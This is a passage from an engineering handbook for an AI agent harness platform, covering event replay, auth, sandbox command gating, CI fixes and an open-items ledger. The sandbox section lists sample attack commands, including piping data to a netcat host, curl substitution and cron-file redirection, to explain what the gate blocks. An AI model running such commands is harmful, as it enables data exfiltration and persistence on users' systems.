    await self.ensure_run(project_id, run_id)   # seeds agent_runs parent, race-safe
```

`ensure_run` tolerates concurrent creators: unique-PK violation on insert is
rolled back and treated as success, because the row existing is the goal.

### 7.2 project_ws — subscribe-before-replay + seq-gap self-healing

```python
queue = await bus.subscribe(project_id)          # FIRST: buffer live events now
try:
    last_seq = int(afterSeq)
    for envelope in await bus.replay(project_id, last_seq):
        await websocket.send_json(envelope.model_dump())
        last_seq = max(last_seq, envelope.seq)
    while True:
        envelope = await queue.get()
        if last_seq and envelope.seq > last_seq + 1:   # overflow dropped something
            await websocket.close(code=1013)           # force client reconnect
            break
        await websocket.send_json(envelope.model_dump())
        last_seq = envelope.seq
finally:
    await bus.unsubscribe(project_id, queue)
```

Why this shape is correct:

| Concern | Mechanism |
|---|---|
| Event published during history send | Already queued by subscribe-first |
| Duplicate delivered (in both replay and queue) | Client dedups by seq (`mergeEvents`) |
| Overflow dropped N live events | seq gap detected server-side → close(1013) |
| Client reconnect | sends `afterSeq=lastSeq` → replay fills gap |
| Cross-tenant access | `_require_project_access` BEFORE accept (close 4403) |

Client-side contract that makes this work (do not break):
`section7/src/lib/useEventStream.ts mergeEvents()` dedups on `seq` equality and
sorts ascending; reconnect uses `lastSeqRef`. Any new consumer of the bus MUST
reuse this pattern or implement equivalent dedup.

### 7.3 Rehydration — how a fresh process rebuilds a run

Entry point: every public service method starts with
`run_data = await self._ensure_run(run_id)`.

```python
async def _ensure_run(self, run_id, project_id=None):
    if run_id in self.runs:
        return self.runs[run_id]                     # warm cache hit
    sm = AgentStateMachine(run_id=run_id, on_event=self._emit)
    rd = {fresh skeleton}
    rehydrated = await self._rehydrate(run_id, sm, rd)
    if not rehydrated and factory and bus:
        await bus.ensure_run(project_id or "", run_id)   # seed parent row early
    self.runs[run_id] = rd
    return rd
```

`_rehydrate` speaks raw SQL to frozen tables (`_REHYDRATE_SQL`, `_PLAN_SQL`),
because section boundaries forbid importing S1's ORM models. Three steps:

1. **Load latest plan row** into PlanService (goal, steps, approval status).
   This restores `get_plan` / approval checks without any other source.
2. **Replay events ascending**, folding into SM state via `_EVENT_STATE_MAP`.
3. **PLAN_APPROVED is special-cased** (not in the map) because it carries data:
   `payload.planId` re-binds `rd["plan_id"]` and flips `plan_approved`.

State mapping reference (why each target):

| Last relevant event | Rehydrated state | Rationale |
|---|---|---|
| plan_proposed | AWAITING_PLAN_APPROVAL | waiting gate is the semantic truth |
| execution_started | EXECUTING | run was live when process died |
| paused | PAUSED | user intent persists across restarts |
| resumed | EXECUTING | resume flipped it back |
| done_signal_received | REVIEWING | review was mid-flight |
| review_passed | EXECUTING | mirrors live behavior (SM returns to executing) |
| review_failed | BLOCKED | needs human attention |
| blocked_awaiting_clarification | BLOCKED | same |
| pr_opened | PR_OPENED | terminal-ish, preserved |

Two portability traps baked into this code (both bit us live):

```python
if isinstance(payload, str):        # sqlite JSON columns return str via raw SQL
    payload = json.loads(payload)
...
res = await db.execute(text(...))   # WRONG: await db.execute(...).first()
run_row = res.first()               #   binds attribute access BEFORE await
```

The `.first()` precedence bug produced `AttributeError: 'coroutine' object has
no attribute 'first'`, which the broad except swallowed as "nothing to
rehydrate" — silent wrong-behavior, caught only because the integration test
asserted concrete state. **Rule: never chain methods onto `await db.execute(...)`;
assign the result first.**

### 7.4 Auth dependency chain — request to principal

```
HTTP request (Authorization: Bearer <token>)
  └─ FastAPI Depends(get_principal)            [section4/api.py]
       ├─ app.state.get_principal missing?      → 503 AUTH_NOT_CONFIGURED (fail closed)
       └─ make_bearer_dep(factory)              [contracts/fastapi_auth.py]
            ├─ sha256(token) → lookup auth_sessions JOIN team_members
            ├─ expires_at naive? assume UTC; expired? → 401
            └─ Role(raw): try value ('admin'), fall back to NAME ('ADMIN')
                 → Principal(userId, teamId, role)
```

Role storage table (memorize this):

| Written by | Stored bytes | Read path | Needs fallback? |
|---|---|---|---|
| ORM insert (`role=Role.ADMIN.value`) | `'admin'` | ORM select | no (typed) |
| SQLAlchemy Enum column reload | `'ADMIN'` (NAME!) | raw SQL | YES |
| sqlite test fixtures raw INSERT | either | raw SQL | handled |

Fail-closed rule: any NEW service router must resolve principal through
`app.state.get_principal` wired by deploy assembly, exactly like orchestrator.
A router reachable without wiring = bug; default-deny (503), never allow-all.

Approver identity law: **identity comes from the session token, never the body.**
`PlanActionRequest.userId` was removed for this reason; if you find yourself
adding a client-supplied actor field, stop.

### 7.5 Sandbox command gate — what's rejected and why

```python
def find_unquoted_shell_syntax(cmd): ...   # returns reason | None
```

Rejected outside quotes, one class at a time:

| Class | Example attack | Why tokens[0] check missed it |
|---|---|---|
| chaining `; && || &` | `git status && python -c 'os.system(...)'` | first token `git` allowed |
| pipes `\|` | `cat f \| nc evil 4444` | first token `cat` allowed |
| substitution `` ` `` `$(` | `echo $(curl evil.sh)` | first token `echo` allowed |
| redirection `< >` | `pytest > /etc/cron.d/x` | writes bypass path-edit validation |
| newline | multi-line smuggle | shell treats as separator |

Quoted operators remain literal text: `grep "a|b"` passes — the scanner tracks
quote state char-by-char (single quotes literal; double quotes honor backslash).

Timeouts close the resource side: `exec` streams under a total budget
(`config.default_timeout_seconds`), kills on breach, raises
`SandboxCommandTimeoutError`; `destroy()` SIGKILLs tracked procs so workspace
deletion can't orphan writers. `CancelledError` also kills the child — canceling
an HTTP request must not leak processes.

Residual honesty: interpreters stay allow-listed (the product runs code), so
policy is not yet *confinement*. Treat local_runner as policy-gated until the
Seatbelt/Landlock wrapper lands (roadmap #3).

### 7.6 Engine task lifecycle — cancellation semantics

```
start_execution(runId)
  sm.start_execution()                    # state flips synchronously
  rd["cancel_requested"] = False
  rd["task"] = create_task(_execute(rd, plan))

_execute:
  result = await to_thread(engine.execute_goal)     # blocking SDK call off-loop
  ├─ CancelledError  → engine_result={"status":"cancelled"} ; return
  ├─ Exception       → engine_result={"status":"error", message} ; return
  └─ done: if rd["cancel_requested"]: DISCARD (zombie) else rd["engine_result"]=result

pause_agent / stop_agent / submit_human_edit / signal_done:
  sm transition (immediate, truthful)
  _cancel_live_task(rd): cancel_requested=True; task.cancel()
```

Why discard-instead-of-adopt: `to_thread` cannot kill a C-level SDK call, so a
cancelled run's thread may STILL complete later. If we adopted its result, a
"stopped" run would silently finish its work — the exact lie GAP-F7 removed.
Status exposes `executing: bool` (task alive?) separate from `state` so the UI
can show "stopping…" honestly.

---

## Part 8 — DeepSeek Harness concept mapping (what we borrowed, what's next)

| dsh concept | Our equivalent | Status | Next step |
|---|---|---|---|
| Append-only SessionEvent log = source of truth | `agent_events` via S1 EventBus | **SHIPPED** (F8/H3) | add streaming types (M2) |
| Resume/fork/replay as log projections | rehydration + afterSeq replay + seq dedup | **SHIPPED** | fork = replay-to-new-run-id (cheap follow-up) |
| "New model-visible input ⇒ new session event" | additive EventTypes discipline | process adopted | terminal_output/diff_progress |
| No privileged core / everything plugin | frozen contracts + protocol classes | equivalent guarantee, simpler | revisit only for 3P plugins |
| Guarded tool-execution pipeline | sandbox validate+allow-list+timeout | partial | OS confinement (Seatbelt/Landlock) |
| Retry → downgrade → rollback around calls | none in engine yet | OPEN | wrap execute_goal w/ S3 fallback model chain |
| Provider catalog (competitors as plugins) | S3 router + mock triggers | partial | declarative provider table |
| Spec-derived surfaces (no drift) | hand-mirrored TS types | drift-prone (M1 proved it) | pydantic→TS codegen in CI |
| Profiles/bundles composition | single docker-compose | fine at our scale | profiles only if multi-env pain appears |
| Financial-grade auditability | audit_log + cost_ledger schema exist | wired for review only | emit cost events per model call |
| Compete-on-standard openness | private repo | product decision | n/a |

Borrowed *judgment*, not just mechanics:

1. Persistence succeeds or the operation fails; projections may lag, the log
   may not lie.
2. Fail-closed beats convenient (503 AUTH_NOT_CONFIGURED, master-key refusal).
3. Honest states over optimistic ones (`executing:false` after restart instead
   of pretending the task survived).
4. Constraints documented where the next agent will trip: docstrings at the
   exact function, not wiki pages.

---

## Part 9 — Agent command reference

Per-section verification (must be green before ANY PR):

```bash
cd sectionN && ./.venv/bin/python -m pytest tests/ -q   # N ∈ {1,2,3,4,5,6,8,10}
cd section7  && npx vitest run                          # frontend logic
cd integration && ../section1/.venv/bin/python -m pytest test_checkpoint1.py -q
cd sectionN && ./.venv/bin/ruff check src tests         # lint everywhere
sh -n deploy/entrypoint.sh                              # parse-only shell gate
docker compose -f deploy/docker-compose.yml config -q   # compose syntax gate
```

Stack lifecycle:

```bash
docker compose -f deploy/docker-compose.yml up -d --build   # boot (backend healthcheck gates frontend)
docker compose -f deploy/docker-compose.yml ps               # wait for "(healthy)"
docker logs harness-backend-1 --tail 100                     # boot/applied-migration output
docker compose -f deploy/docker-compose.yml down -v          # full reset (destroys data!)
docker restart harness-backend-1                             # rehydration smoke test
```

Auth + probe cheat-sheet (see Part 5 for expected outputs):

```bash
TOK=$(curl -s -X POST localhost:8001/api/v1/auth/login \
  -H 'content-type: application/json' -d '{"email":"a@test.dev"}' \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
PROJ=$(curl -s localhost:8001/api/v1/projects -H "Authorization: Bearer $TOK" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["items"][0]["id"])')

# unauthenticated probe MUST return 401/403/503:
curl -s -o /dev/null -w '%{http_code}\n' -X POST \
  localhost:8004/api/v1/orchestrator/runs/probe-1/plan

# cross-tenant probe MUST return 403 (use a second account's token):
curl -s -o /dev/null -w '%{http_code}\n' \
  "localhost:8001/api/v1/projects/$PROJ/events/replay" -H "Authorization: Bearer $OTHER_TOK"
```

Manual migration run (no container):

```bash
cd deploy/runners && HARNESS_DATABASE_URL=postgresql+asyncpg://harness:harness@localhost:5432/harness \
  HARNESS_MASTER_KEY=x HARNESS_ALLOW_DEV_MASTER_KEY=1 ../../section1/.venv/bin/python migrate.py
```

SDK pin check (AGENTS.md rule):

```bash
curl -s https://pypi.org/pypi/deepseek-harness-sdk/json \
  | python3 -c 'import sys,json;print(sorted(json.load(sys.stdin)["releases"])[-1])'
# then confirm deploy/backend.Dockerfile pins EXACTLY this version
```

Failure → fix table (all five were live incidents on 2026-08-22):

| Symptom | Root cause | Fix |
|---|---|---|
| build fails `"/section9": not found` | .dockerignore excluded frontend sources | exclude caches only |
| build fails on pip SDK install | pinned version absent from PyPI | pin real latest (0.1.1rc1) |
| `relation "teams" does not exist` during migrate | comment line swallowed statement in splitter | strip comment LINES not fragments |
| uvicorn dies: `error parsing value for field "cors_origins"` | pydantic-settings wants JSON lists in env | env value `["http://localhost:3000"]` |
| 500 on auth'd route: `'ADMIN' is not a valid Role` | Enum stores NAMES, StrEnum values differ | accept name-or-value in raw-SQL reads |

---

## Part 10 — Open-items ledger

Carry these forward verbatim in STATUS.md updates.

| ID | Item | Size | Blocking? |
|----|------|------|-----------|
| ~~H8~~ | WS ticket auth | DONE wave 2 | — |
| ~~H2r~~ | Login ownership proof (OTP/OAuth flag) | DONE wave 3 | was before public exposure |
| ~~F6r~~ | Seatbelt/Landlock confinement | DONE wave 3 | — |
| ~~E-smtp~~ | SMTP delivery | DONE wave 4 | — |
| ~~E-fe-otp~~ | OTP frontend | DONE wave 4 | — |
| ~~M2~~ | streaming event types end-to-end | DONE wave 2 | — |
| ~~E-rdg~~ | Engine fallback chain (`DSH_FALLBACK_MODELS`) | DONE wave 2 (S4 tests) | no |
| ~~E-s3~~ | Route fallback candidates through S3 catalog instead of env list | DONE wave 4 (ctor > env > catalog) | no |
| ~~E-cat~~ | Declarative provider catalog in S3 | DONE wave 4 | no |
| ~~E-codegen~~ | pydantic→TS type generation, drop hand mirror | DONE wave 4 (--check gate) | — |
| ~~M4~~ | `/health?deep=1` DB ping | DONE wave 2 (live-verified 2026-08-22) | no |
| ~~M5~~ | list_projects limit param | DONE wave 2 | no |
| ~~CI~~ | sh -n + compose config + probes nightly | DONE wave 4; nightly `17 6 * * *` green | — |
| ~~E-seed~~ | seed_demo idempotency vs per-login team minting | fixed wave 5 (persisted session) | no |
| ~~CI-S1HANG~~ | section1 pytest job hung forever on CI runners | FIXED wave 5b (see Appendix G) | was blocking CI |
| ~~RESUME~~ | Checkpoint-aware engine resume (Appendix C FAQ: pause/restart re-executes goals) | DONE 2026-08-22 (commit bce2b1c: resume respawns engine task, same session_id ⇒ dsh continues its session; 5 tests) | no |
| ~~D1~~ | Compose default `DSH_MODEL` pointed at nonexistent local model | FIXED 2026-08-22 (default → `qwen3.5-9b-128k:latest`) | was ops |
| ~~D2~~ | Engine fake-success: empty finalResponse counted as completed, fallback ladder never triggered | FIXED 2026-08-22 (empty/non-completed rung ⇒ fall through ⇒ honest error; stress tests migrated to per-call model arg) | was HIGH |
| ~~D3~~ | Event-publish race under fast successive actions (`execution_started` sequenced before `plan_approved`) | FIXED 2026-08-22 (per-run publish chains serialize bus order behind causal order; regression test) | was MEDIUM |
| ~~D4~~ | Engine settle emitted no event, never advanced the state machine (UI had to poll) | DONE 2026-08-22 (contracts 0.3.0 additive `engine_completed`/`engine_failed`, TS mirror regenerated same commit, SM advances EXECUTING→AWAITING_DONE_SIGNAL/BLOCKED, golden fixtures, S1 conformance pin) | was MEDIUM |
| LIVEPROBE | Flaky local-Ollama live engine test replaced by OpenRouter probe (stealth/ox-alpha, real side-effect assertion, fresh session dirs — reused dsh session_root poisoned reruns) | DONE 2026-08-22; skips without OPENROUTER_API_KEY so CI stays green offline | no |
| OAUTH-CREDS | Real GITHUB_CLIENT_ID/SECRET in deploy env so Settings Connect goes live (code DONE wave 5; without creds :8002 503s NOT_CONFIGURED by design) | config-only | demo day |
| DB-RESTART | db container had `restart:` policy missing — host restart left backend DNS-crash-looping | trivial, FIXED 2026-08-22 (`restart: unless-stopped`) | was ops |

Definition of done for any new gap card added here: code + test proving the fix
+ entry in this ledger (or removal), updated in the SAME commit.

---

## Appendix A — Event catalog (post-fix wire truth)

All envelopes: `{"type","payload","ts","seq","projectId","runId"}` (frozen
`EventEnvelope`). Payloads below are what S4 emits today; golden fixtures pin
`{"fixture": true}` placeholders only, so payload keys are governed by
`state_machine.py` — change both together.

| type | emitted by | payload keys | notes |
|---|---|---|---|
| plan_proposed | `sm.plan_proposed` | planId, runId | after `_persist_plan(proposed)` |
| plan_approved | `sm.approve_plan` | planId, runId, approvedBy | approvedBy = session principal now |
| execution_started | `sm.start_execution` | runId | engine task spawned right after |
| paused | `sm.pause` / `submit_human_edit` | runId[, reason, path] | reason=human_edit implies flag |
| resumed | `sm.resume` | runId | state-only; live task NOT auto-respawned |
| blocked_awaiting_clarification | `sm.block_for_clarification` | runId, question | reserved |
| done_signal_received | `sm.signal_done` | runId | reviewer runs synchronously next |
| review_passed | `sm.reviewer_passed` | runId, findings{camelCase} | findings via by_alias |
| review_failed | `sm.reviewer_failed` | runId, findings | → BLOCKED |
| pr_opened | `sm.open_pr` | runId, pr{...} | S2 integration point |

Delivery semantics recap: insert always wins (source of truth); live push is
at-least-once *per connection lifetime* with seq-gap healing; duplicates only
inside the subscribe/replay overlap window.

## Appendix B — contracts package inventory

`harness_contracts` (FROZEN unless version-bumped + mocks updated same commit):

| Module | Exports | Primary consumers |
|---|---|---|
| events.py | EventType, EventEnvelope, event_envelope, EVENT_TYPES | S1 bus, S4 SM, S7/S9 UI, TS mirror |
| plan.py | AgentPlan | S4 planner, agent_plans mirror row |
| brief.py | EngineeringBrief types | S6 |
| roles.py | Principal, Role | every service auth path |
| security.py | KeyVault (+hint) | S1 crypto, S2 tokens, deploy wiring |
| api.py | API_PREFIX, error-body helpers | all routers |
| signatures.py | Orchestrator/ModelRouter/Sandbox protocols, ModelCallOpts/Result/Role, TaskHandle | section-boundary typing |
| fastapi_auth.py | make_bearer_dep, hash_token | S4 app wiring, S8 |

TS mirror lives at `contracts/ts/src/*`; keep both sides in the same commit as
any additive change until codegen replaces it (ledger E-codegen).

## Appendix C — Agent FAQ ("why is it like this?")

**Q: Why raw SQL in service.py instead of importing S1 models?**
Section boundary rule: import ONLY harness_contracts across sections.
fastapi_auth set the precedent (raw SQL against frozen table names). ORM imports
would couple deploys and violate AGENTS.md layout rules.

**Q: Why does approve_plan take principal_user_id if the API ignores body userId?**
Service layer serves two callers: HTTP routes (identity = session principal) and
tests/internal flows (explicit actor). The API layer enforces where identity may
originate; the service records whoever called it honestly.

**Q: Why did status show executing:false while state=executing after restart?**
Honest-state principle. The STATE rehydrated from history; no live task exists
in the new process. Conflating them would recreate GAP-F7's lie. Re-starting
execution is an explicit human action.

**Q: Why 503 (not 401) when auth isn't wired?**
401 says "your credentials are bad" — misleading when the DEPLOYMENT is broken.
503 signals server misconfiguration and pages the right brain.

**Q: Why is pause not resume-safe for the engine work?**
The dsh SDK call is opaque blocking I/O in a thread; we quarantine its result on
cancel. Auto-respawn would double-execute side effects. Roadmap: make execute_goal
checkpoint-aware so resume continues rather than restarts.
(Update 2026-08-22: half-shipped — `resume_agent` now re-spawns the engine task
with the same run_id as dsh session_id, so an explicit human Resume CONTINUES the
dsh session instead of restarting blind; see ledger RESUME / commit bce2b1c.
Auto-resume on process restart is still deliberately manual.)

**Q: Why JSON env for CORS origins?**
pydantic-settings JSON-decodes complex fields; plain strings crash Settings
construction for EVERY section sharing the prefix. One compose default teaches
the convention.

**Q: Why does migrate.py mark legacy DBs as 0001-applied instead of running it?**
Legacy DBs already have the schema via create_all; rerunning CREATE TABLE fails.
Marker insertion makes the runner idempotent across pre/post-fix databases.

**Q: Why keep the single-container seven-service layout?**
Blast radius vs ops cost: watchdog stop-the-world beats partial silent breakage
for a dev-grade platform, and per-service containers multiply build time. Ledger
tracks the split trigger conditions.

**Q: Why camelCase aliases instead of renaming fields?**
Python call sites (tests, internal kwargs) use snake_case; the wire needs
camelCase. populate_by_name keeps both true with one declaration — smallest
change that fixes M1 without a rename cascade.

**Q: What's the first thing to do before any new feature here?**
Run Part 9's verification matrix. If green, write the failing test for your
feature, then code. If red, you found a gap — card it here first.

## Appendix D — Glossary

| Term | Meaning |
|---|---|
| the log / bus | `agent_events` table + S1 EventBus delivery layer |
| envelope | Frozen WS/REST event wrapper `{type,payload,ts,seq,projectId,runId}` |
| seq | Monotonic per-table cursor; clients track lastSeq for reconnect |
| rehydration | Rebuilding in-memory run state by replaying persisted events |
| zombie result | Engine output arriving after cancellation; discarded by design |
| fail-closed | Missing wiring/config blocks service startup or request (503/SystemExit) |
| golden fixtures | Frozen payload samples gating conformance tests per section |
| ensure_run | Idempotent parent-row seeding making FK-safe publishing possible |
| gap detection | Server-side `seq > last+1` check forcing client replay reconnect |
| policy gate | validate_command/validate_path_edit checks before sandbox exec |
| ticket | (planned, H8) short-lived one-time WS credential replacing query tokens |

## Appendix E — Changelog of this hardening wave

**2026-08-22 — "make it production-grade" session**

Scope: static review of all 10 sections + deploy; fix all FATALs; live-verify
against a real docker compose stack; leave behind this document.

Fixed: F1(externally, verified) F2 F3 F4 F5 F6 F7 F8 F9 · H1 H3 H4 H5 H6 H7 H9
· M1 M6. Open ledger: H8 H2r F6r M2 M4 M5 + three dsh-inspired enhancements.

Test delta: 383 → 392 backend/integration (+13 new guards, net of conversions);
vitest 39 unchanged-and-green; ruff clean in every touched section.

Live-stack proof chain: healthy boot → 401 on anonymous plan → 403 cross-tenant
→ full propose/approve/start with bus persistence → mid-run container restart
with state rehydrated from log alone → stop → done → frontend 200.

Five runtime incidents were caught and fixed inside the loop (dockerignore,
SDK pin, migration splitter, CORS env JSON, enum name/value). Each is now a row
in Part 9's failure table so the next agent recognizes it in seconds.

Rule going forward: no PR merges red Part 9 matrix; no new privileged endpoint
without an auth dependency wired through app.state; no contract change without
its TS mirror and mocks in the same commit.





---

## Appendix F — Wave 5 additions

### FEAT-OAUTH — GitHub web application flow in S2
Endpoints: `/oauth/start` (+one-time `/oauth/start-ticket` for browsers),
`/oauth/callback` (CSRF state, exchange, KeyVault-encrypted store, granted
scopes, redirect to `{frontend_base}/settings`), `/connection` (never echoes
tokens). Compose maps GITHUB_* env onto HARNESS_GITHUB_*. Tests: 9 new
(test_oauth_flow.py) + legacy test migrated. Live: NOT_CONFIGURED 503 envelope;
fake-creds happy-path-to-error redirect chain verified.

Known follow-ups (not defects): oauth_states/tickets are per-process memory —
fine for the single-container deployment, move to the DB if services scale out
horizontally; real client_id/secret still needed from the operator for the
actual exhibition login.

## Appendix G — CI-S1HANG: section1 pytest job hung forever on runners

**Severity:** HIGH (blocked every green CI run since wave 4).
**Evidence:** runs 32575662470 / 32580323874 cancelled at exactly the
timeout-minutes=15 ceiling with zero pytest output; all other jobs passed.
Local macOS suite: 48 passed in ~1s. Predates wave-5 OAuth work.

**Diagnosis chain (each step reproducible):**
1. Downloaded concluded-run logs via `gh api .../actions/runs/<id>/logs`:
   the pytest step started but never printed (stdout block-buffering made
   "no dots" ambiguous; not proof of pre-test hang).
2. Reproduced under `docker run python:3.13` with `-o faulthandler_timeout`:
   stack dump pinned `test_ws_auth.py` and showed the main thread joined in
   anyio portal teardown while a worker thread sat in `run_forever`.
3. Bisect: each WS test PASSED alone (0.16s); the FILE hung, wedge point
   moving between tests → race, not deterministic.
4. Env-var trace inside project_ws pinned the stall to the first DB await.

**Root cause:** cross-loop aiosqlite. The async `db` fixture's engine opened
pooled connections on pytest-asyncio's loop; starlette TestClient ran app
code on its anyio portal loop. When project_ws checked out a connection
born on the dead fixture loop, the aiosqlite worker raised
"Event loop is closed" handing results back and that await never completed.
Whichever pooled connection was checked out decided pass vs hang.

**Fix:** test-side — rewrote test_ws_auth.py with MiniWs, a raw-ASGI WS
driver running the app on the CURRENT asyncio loop (single-loop, no threads).
Also asserted ticket/project mismatch = 4401 per _redeem_ticket semantics.
App-side (b1fb041): project_ws now races a receive() watcher against
queue.get() so silent/disconnected clients release their subscription
instead of parking forever (real production leak, independent of tests).

**Verify:** linux/python3.13 docker run of the full suite: 49 passed,
exit 0. CI run 32584797390: SUCCESS in 37s.
**Regression guard:** test_silent_client_disconnect_does_not_wedge_handler;
any future TestClient-style threaded WS test should be rejected in review.
